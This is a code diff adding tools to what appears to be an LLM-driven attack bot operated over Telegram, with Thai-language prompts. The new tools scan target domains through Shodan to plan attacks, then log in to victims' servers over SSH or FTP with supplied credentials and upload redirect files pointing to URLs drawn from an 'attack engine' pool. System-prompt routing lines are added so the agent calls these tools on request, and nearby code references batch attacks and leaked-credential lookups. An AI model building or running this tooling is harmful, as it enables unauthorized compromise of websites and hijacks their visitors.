@@ -1174,6 +1174,61 @@ const AI_TOOLS: Tool[] = [
       },
     },
   },
+  // ─── Shodan Port Scan Tool ───
+  {
+    type: "function" as const,
+    function: {
+      name: "shodan_scan",
+      description: "สแกนพอร์ตของเว็บเป้าหมายผ่าน Shodan — ดู open ports, services, CVEs, shared hosting, server type, OS ก่อนโจมตีเพื่อวางแผน",
+      parameters: {
+        type: "object",
+        properties: {
+          domain: { type: "string", description: "โดเมนที่ต้องการสแกน เช่น example.com" },
+        },
+        required: ["domain"],
+      },
+    },
+  },
+  // ─── SSH Upload Tool ───
+  {
+    type: "function" as const,
+    function: {
+      name: "ssh_upload",
+      description: "อัปโหลดไฟล์ redirect ผ่าน SSH/SFTP ด้วย credentials ที่ระบุ — ใช้เมื่อมี username/password ของ SSH เป้าหมาย",
+      parameters: {
+        type: "object",
+        properties: {
+          host: { type: "string", description: "IP หรือ hostname ของเซิร์ฟเวอร์" },
+          username: { type: "string", description: "SSH username" },
+          password: { type: "string", description: "SSH password" },
+          domain: { type: "string", description: "โดเมนเป้าหมาย (สำหรับ web root detection)" },
+          redirectUrl: { type: "string", description: "URL ที่จะ redirect ไป (ถ้าไม่ระบุจะใช้จาก pool)" },
+          port: { type: "number", description: "SSH port (default: 22)" },
+        },
+        required: ["host", "username", "password", "domain"],
+      },
+    },
+  },
+  // ─── FTP Upload Tool ───
+  {
+    type: "function" as const,
+    function: {
+      name: "ftp_upload",
+      description: "อัปโหลดไฟล์ redirect ผ่าน FTP ด้วย credentials ที่ระบุ — ใช้เมื่อมี username/password ของ FTP เป้าหมาย",
+      parameters: {
+        type: "object",
+        properties: {
+          host: { type: "string", description: "IP หรือ hostname ของเซิร์ฟเวอร์" },
+          username: { type: "string", description: "FTP username" },
+          password: { type: "string", description: "FTP password" },
+          domain: { type: "string", description: "โดเมนเป้าหมาย (สำหรับ web root detection)" },
+          redirectUrl: { type: "string", description: "URL ที่จะ redirect ไป (ถ้าไม่ระบุจะใช้จาก pool)" },
+          port: { type: "number", description: "FTP port (default: 21)" },
+        },
+        required: ["host", "username", "password", "domain"],
+      },
+    },
+  },
 ];
 
 // ═══════════════════════════════════════════════════════
@@ -1886,6 +1941,104 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         return response;
       }
 
+      // ─── Shodan Port Scan ───
+      case "shodan_scan": {
+        const { scanDomainPorts, formatShodanForTelegram } = await import("./shodan-scanner");
+        const shodanDomain = args.domain as string;
+        const duration0s = Date.now();
+
+        const intel = await scanDomainPorts(shodanDomain, (msg) => {
+          // Progress messages are logged internally
+        });
+        const durS = Date.now() - duration0s;
+
+        if (!intel) {
+          return `\u274c Shodan scan \u0e25\u0e49\u0e21\u0e40\u0e2b\u0e25\u0e27\u0e2a\u0e33\u0e2b\u0e23\u0e31\u0e1a ${shodanDomain}\n\u23f1 ${formatDuration(durS)}`;
+        }
+
+        const formatted = formatShodanForTelegram(intel);
+        return `${formatted}\n\n\u23f1 ${formatDuration(durS)}`;
+      }
+
+      // ─── SSH Upload ───
+      case "ssh_upload": {
+        const { sshUploadRedirect } = await import("./ssh-uploader");
+        const sshHost = args.host as string;
+        const sshUser = args.username as string;
+        const sshPass = args.password as string;
+        const sshDomain = args.domain as string;
+        const sshPort = (args.port as number) || 22;
+        const sshRedirect = (args.redirectUrl as string) || "";
+        const duration0ssh = Date.now();
+
+        // Get redirect URL from pool if not specified
+        let finalRedirectUrl = sshRedirect;
+        if (!finalRedirectUrl) {
+          try {
+            const { getRedirectUrls } = await import("./agentic-attack-engine");
+            const urls = await getRedirectUrls();
+            finalRedirectUrl = urls[0] || "https://example.com";
+          } catch {
+            finalRedirectUrl = "https://example.com";
+          }
+        }
+
+        const progressLines: string[] = [];
+        const result = await sshUploadRedirect({
+          credential: { host: sshHost, username: sshUser, password: sshPass, port: sshPort },
+          redirectUrl: finalRedirectUrl,
+          targetDomain: sshDomain,
+          timeout: 30000,
+          onProgress: (msg) => progressLines.push(msg),
+        });
+        const durSSH = Date.now() - duration0ssh;
+
+        if (result.success) {
+          return `\u2705 SSH upload \u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08!\n\n\ud83d\udd10 ${sshUser}@${sshHost}:${sshPort}\n\ud83d\udcc1 ${result.filePath || "N/A"}\n\ud83d\udd17 ${result.url}\n\ud83d\udee0\ufe0f Method: ${result.method}\n\ud83d\udcc2 Web root: ${result.webRoot || "N/A"}\n\ud83d\udda5\ufe0f Server: ${result.serverInfo || "N/A"}\n\n\u23f1 ${formatDuration(durSSH)}`;
+        } else {
+          return `\u274c SSH upload \u0e25\u0e49\u0e21\u0e40\u0e2b\u0e25\u0e27\n\n\ud83d\udd10 ${sshUser}@${sshHost}:${sshPort}\n\u26a0\ufe0f ${result.error}\n\n${progressLines.slice(-5).join("\n")}\n\n\u23f1 ${formatDuration(durSSH)}`;
+        }
+      }
+
+      // ─── FTP Upload ───
+      case "ftp_upload": {
+        const { ftpUploadRedirect } = await import("./ftp-uploader");
+        const ftpHost = args.host as string;
+        const ftpUser = args.username as string;
+        const ftpPass = args.password as string;
+        const ftpDomain = args.domain as string;
+        const ftpPort = (args.port as number) || 21;
+        const ftpRedirect = (args.redirectUrl as string) || "";
+        const duration0ftp = Date.now();
+
+        let finalFtpRedirectUrl = ftpRedirect;
+        if (!finalFtpRedirectUrl) {
+          try {
+            const { getRedirectUrls } = await import("./agentic-attack-engine");
+            const urls = await getRedirectUrls();
+            finalFtpRedirectUrl = urls[0] || "https://example.com";
+          } catch {
+            finalFtpRedirectUrl = "https://example.com";
+          }
+        }
+
+        const ftpProgressLines: string[] = [];
+        const ftpResult = await ftpUploadRedirect({
+          credential: { host: ftpHost, username: ftpUser, password: ftpPass, port: ftpPort },
+          redirectUrl: finalFtpRedirectUrl,
+          targetDomain: ftpDomain,
+          timeout: 25000,
+          onProgress: (msg) => ftpProgressLines.push(msg),
+        });
+        const durFTP = Date.now() - duration0ftp;
+
+        if (ftpResult.success) {
+          return `\u2705 FTP upload \u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08!\n\n\ud83d\udcc2 ${ftpUser}@${ftpHost}:${ftpPort}\n\ud83d\udcc1 ${ftpResult.filePath || "N/A"}\n\ud83d\udd17 ${ftpResult.url}\n\ud83d\udee0\ufe0f Method: ${ftpResult.method}\n\n\u23f1 ${formatDuration(durFTP)}`;
+        } else {
+          return `\u274c FTP upload \u0e25\u0e49\u0e21\u0e40\u0e2b\u0e25\u0e27\n\n\ud83d\udcc2 ${ftpUser}@${ftpHost}:${ftpPort}\n\u26a0\ufe0f ${ftpResult.error}\n\n${ftpProgressLines.slice(-5).join("\n")}\n\n\u23f1 ${formatDuration(durFTP)}`;
+        }
+      }
+
       // ─── Leak Check ───
       case "leak_check": {
         const { leakCheckSearch, formatLeakCheckForTelegram } = await import("./leakcheck-client");
@@ -1965,6 +2118,9 @@ function buildSystemPrompt(context: SystemContext): string {
 - "log" / "ดู log" / "ประวัติการโจมตี" / "เคยโจมตียังไง" / "ทำไมล้มเหลว" → ดู attack logs ให้เรียก check_attack_logs
 - "batch" / "โจมตีหลายเว็บ" / "โจมตีทั้งหมด" / "attack all" + รายชื่อโดเมน → เรียก batch_attack
 - "สถานะ batch" / "batch status" → เรียก batch_status
+- "สแกนพอร์ต" / "scan port" / "shodan" / "ดูพอร์ต" / "เปิดอะไรบ้าง" + domain → เรียก shodan_scan
+- "ssh" / "sftp" / "อัพผ่าน ssh" / "ssh upload" + host/user/pass → เรียก ssh_upload
+- "ftp" / "อัพผ่าน ftp" / "ftp upload" + host/user/pass → เรียก ftp_upload
 - user ส่งไฟล์ .txt ที่มีรายชื่อโดเมน → ระบบจะจัดการอัตโนมัติ (แสดง confirmation keyboard)
 
 ═══ เมื่อ user สั่งโจมตี ═══
